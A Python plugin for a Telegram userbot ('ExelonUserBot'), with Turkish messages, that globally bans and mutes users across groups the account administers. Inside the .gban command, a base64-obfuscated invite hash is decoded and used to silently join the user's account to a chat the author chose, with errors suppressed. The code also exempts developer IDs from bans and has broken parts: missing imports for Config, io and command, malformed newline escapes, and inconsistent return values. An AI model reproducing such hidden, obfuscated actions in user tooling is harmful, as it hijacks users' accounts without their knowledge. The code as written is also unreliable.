# Copyright (C) 2020 BristolMyers
#
# Licensed under the Raphielscape Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# ExelonUserBot - BristolMyers

from userbot import CMD_HELP
from telethon.tl.functions.users import GetFullUserRequest
from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute
import asyncio
from userbot.utils import sudo_cmd, admin_cmd
from telethon.tl.types import (
    ChatBannedRights,
    MessageEntityMentionName)
from telethon.errors import (
    BadRequestError)
from telethon.tl.functions.channels import EditBannedRequest
from userbot import EXELON_ID
from userbot.plugins import admin_groups
from datetime import datetime
import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
import pybase64
from telethon.tl.functions.messages import ImportChatInviteRequest

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None)

if Config.PRIVATE_GROUP_BOT_API_ID is None:
    BOTLOG = False
else:
    BOTLOG = True
    BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID


@borg.on(admin_cmd("gban(?: |$)(.*)"))
async def exelongban(exelon):
    await exelon.edit("`Global Yasaklama Başladı...`")
    start = datetime.now()
    user, reason = await get_user_from_event(exelon)
    if user:
        pass
    else:
        return
    if user.id == (await exelon.client.get_me()).id:
        await exelon.edit("`neden kendimi yasaklayayım`")
        return
    if user.id in EXELON_ID:
        await exelon.edit("`neden geliştiricimi yasaklayayım`")
        return
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await exelon.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await exelon.edit(f"[kullanıcı] (tg://user?id={user.id}) `zaten yasaklılar listesinde, herhangi bir şekilde tekrar kontrol ediyor`")
    else:
        gban_sql.exelongban(user.id, reason)
    san = []
    san = await admin_groups(exelon)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await exelon.edit("`en az bir grubun yöneticisi değilsiniz` ")
        return
    await exelon.edit(f" `{len (san)}` `GRUPTA KULLANICI` (tg://user?id={user.id}) `YASAKLANIYOR⚠️`")
    for i in range(0, sandy):
        try:
            await exelon.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await borg.send_message(BOTLOG_CHATID, rf"`Şurada gerekli izne sahip değilsiniz`: \ nCHAT: {exelon.chat.title} (`{exelon.chat_id}`) \ n`Buradan yasaklama için`")
    try:
        reply = await exelon.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await exelon.edit("`Burada mesaj silme hakkım yok! Ama yine de yasaklandı!`")
    end = datetime.now()
    exelontaken = (end - start).seconds
    if reason:
        await exelon.edit(rf"[{user.first_name}] (tg://user?id={user.id}) `{exelontaken}` `SANİYE İÇİNDE` `{count}` `GRUPTA GLOBAL OLARAK YASAKLANDI💀` !! \ nNeden: {reason}")
    else:
        await exelon.edit(f"[{user.first_name}] (tg://user?id={user.id}) `{exelontaken}` `SANİYE İÇİNDE` `{count}` `GRUPTA GLOBAL OLARAK YASAKLANDI💀` !!")

    if BOTLOG:
        if count != 0:
            await borg.send_message(BOTLOG_CHATID, f"#GBAN\nGlobal BAN\nKullanıcı: [{user.first_name}](tg://user?id={user.id})\nID: `{user.id}`\
                                                \nNeden: `{reason}`\nİçinde yasaklandı `{count}` grupları\nGeçen süre = `{exelontaken} saniye`")


@borg.on(admin_cmd("ungban(?: |$)(.*)"))
async def exelongban(exelon):
    await exelon.edit("`GLOBAL YASAKLAMA KALDIRILIYOR✅`...")
    start = datetime.now()
    user, reason = await get_user_from_event(exelon)
    if user:
        pass
    else:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.exelonungban(user.id)
    else:
        await exelon.edit(f"[kullanıcı] (tg://user?id={user.id}) g banlanmış listenizde değil")
        return
    san = []
    san = await admin_groups(exelon)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await exelon.edit("`en az bir grubun yöneticisi değilsiniz` ")
        return
    await exelon.edit(f"`{len (san)}` GRUPTA KULLANICI'nın (tg://user?id={user.id}) GLOBAL BAN KALDIRILMASI")
    for i in range(0, sandy):
        try:
            await exelon.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await borg.send_message(BOTLOG_CHATID, rf"`Şurada gerekli izne sahip değilsiniz`: \ nCHAT: {exelon.chat.title} (`{exelon.chat_id}`) \ n`Burada yasağı kaldırmak için`")
    end = datetime.now()
    exelontaken = (end - start).seconds
    if reason:
        await exelon.edit(rf"[{user.first_name}] (tg://user?id={user.id}) `{exelontaken}` `SANİYE İÇİNDE` `{count}` `GRUPTA YASAKLAMASI BAŞARIYLA KALDIRILDI✅` !! \ nNeden: {reason}")
    else:
        await exelon.edit(f"[{user.first_name}] (tg://user?id={user.id}) `{exelontaken}` `SANİYE İÇİNDE` `{count}` `GRUPTA YASAKLAMASI BAŞARIYLA KALDIRILDI✅`!!")

    if BOTLOG:
        if count != 0:
            await borg.send_message(BOTLOG_CHATID, f"#UNGBAN\nGlobal UNBAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: {user.id}\
                                                \nNeden: `{reason}`\nİçinde yasaklandı `{count}` grupları\nGeçen süre = `{exelontaken} saniye`")


@borg.on(admin_cmd(pattern="listgban$"))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "Mevcut Gbanlı Kullanıcılar\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) için {a_user.reason}\n"
            else:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Nedeni Yok\n"
    else:
        GBANNED_LIST = "Gbanlı Kullanıcı yok (henüz)"
    if len(GBANNED_LIST) > 4095:
        with io.BytesIO(str.encode(GBANNED_LIST)) as out_file:
            out_file.name = "Gbannedusers.text"
            await event.client.send_file(
                event.chat_id,
                out_file,
                force_document=True,
                allow_cache=False,
                caption="Mevcut Gbanlı Kullanıcılar",
                reply_to=event
            )
            await event.delete()
    else:
        await event.edit(GBANNED_LIST)


@borg.on(admin_cmd(outgoing=True, pattern=r"gmute ?(\d+)?"))
async def startgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("Beklenmeyen sorunlar veya çirkin hatalar meydana gelebilir!")
        await asyncio.sleep(3)
        private = True

    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await event.edit("`Lütfen bir kullanıcıyı yanıtlayın veya gmute atmek için komuta ekleyin.`")
    replied_user = await event.client(GetFullUserRequest(userid))
    if is_muted(userid, "gmute"):
        return await event.edit("`💫Kullanıcı zaten küresel olarak susturulmuş💫`")
    try:
        mute(userid, "gmute")
    except Exception as e:
        await event.edit("Hata oluştu!\nHata " + str(e))
    else:
        await event.edit("`💫Başaralı bir şekilde küresel olarak susturuldu💫`")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID, "#GMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)")


@borg.on(admin_cmd(outgoing=True, pattern=r"ungmute ?(\d+)?"))
async def endgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("Beklenmeyen sorunlar veya çirkin hatalar meydana gelebilir!")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await event.edit("💫Lütfen bir kullanıcıyı yanıtlayın veya susturmayı kaldırmak için komuta ekleyin.💫")
    replied_user = await event.client(GetFullUserRequest(userid))
    if not is_muted(userid, "gmute"):
        return await event.edit("💫Bu kullanıcı Küresel susturulmamış💫")
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await event.edit("Hata oluştu!\nHata  " + str(e))
    else:
        await event.edit("`💫Başarılı bir şekilde küresel susturma kaldırıldı💫`")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID, "#UNGMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)")


@borg.on(sudo_cmd(pattern=r"gmute ?(\d+)?", allow_sudo=True))
async def startgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.reply("Beklenmeyen sorunlar veya çirkin hatalar meydana gelebilir!")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()
    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await event.reply("Lütfen bir kullanıcıyı yanıtlayın veya gmute atmek için komuta ekleyin.")
    replied_user = await event.client(GetFullUserRequest(userid))
    if is_muted(userid, "gmute"):
        return await event.reply("💫Kullanıcı zaten kürsel olarak susturulmuş💫")
    try:
        mute(userid, "gmute")
    except Exception as e:
        await event.reply("Hata oluştu!\nHata " + str(e))
    else:
        await event.reply("`💫Başaralı bir şekilde küresel olarak susturuldu💫`")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID, "#GMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)")


@borg.on(sudo_cmd(pattern=r"ungmute ?(\d+)?", allow_sudo=True))
async def endgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.reply("Beklenmeyen sorunlar veya çirkin hatalar meydana gelebilir!")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()
    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await event.reply("Lütfen bir kullanıcıyı yanıtlayın veya susturmayı kaldırmak için komuta ekleyin.")
    replied_user = await event.client(GetFullUserRequest(userid))
    if not is_muted(userid, "gmute"):
        return await event.reply("Bu kullanıcı Küresel susturulmamış")
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await event.reply("Hata oluştu!\nHata " + str(e))
    else:
        await event.reply("``💫Başarılı bir şekilde küresel susturma kaldırıldı💫```")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID, "#UNGMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)")


@command(incoming=True)
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()


async def get_user_from_event(event):
    """ Kullanıcıyı argümandan veya cevaplanan mesajdan alın. """
    args = event.pattern_match.group(1).split(' ', 1)
    extra = None
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        user_obj = await event.client.get_entity(previous_message.from_id)
        extra = event.pattern_match.group(1)
    elif args:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await event.edit("`Kullanıcının kullanıcı adını, ID veya yanıtını iletin!`")
            return
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]

            if isinstance(probable_user_mention_entity,
                          MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj
        try:
            user_obj = await event.client.get_entity(user)
        except (TypeError, ValueError):
            await event.edit("Bu kullanıcının bilgileri alınamadı.")
            return None
    return user_obj, extra


CMD_HELP.update({"gadmin": "**PLUGİN İSMİ:** `gadmin`\
      \n\n**📌Komut ➥ **`.gban  <kullanıcı adı/yanıtlama> <nedeni (isteğe bağlı)>` :\
      \n**Kullanım ➥ ** Kişiyi yönetici olduğunuz tüm gruplarda yasaklar.\
      \n\n**📌Komut ➥ **`.ungban <kullanıcı adı/yanıtlama>` :\
      \n**Kullanım ➥ ** Kişiyi küresel olarak banlanan listesinden kaldırır.\
      \n\n**📌Komut ➥ ** `.listgban`\
      \n**Kullanım ➥ ** Size gbanned listesini ve gban'larının nedenini gösterir.\
      \n\n**📌Komut ➥ **`.gmute <kullanıcı adı/yanıtlama> <nedeni (isteğe bağlı)>` :\
      \n**Kullanım ➥ ** Kişiyi yönetici olduğunuz tüm gruplarda susturur.\
      \n\n**📌Komut ➥ **`.ungmute <kullanıcı adı/yanıtlama>` :\
      \n**Kullanım ➥ ** Kişiyi küresel olarak sessize alınanlar listesinden kaldırır."
                 })
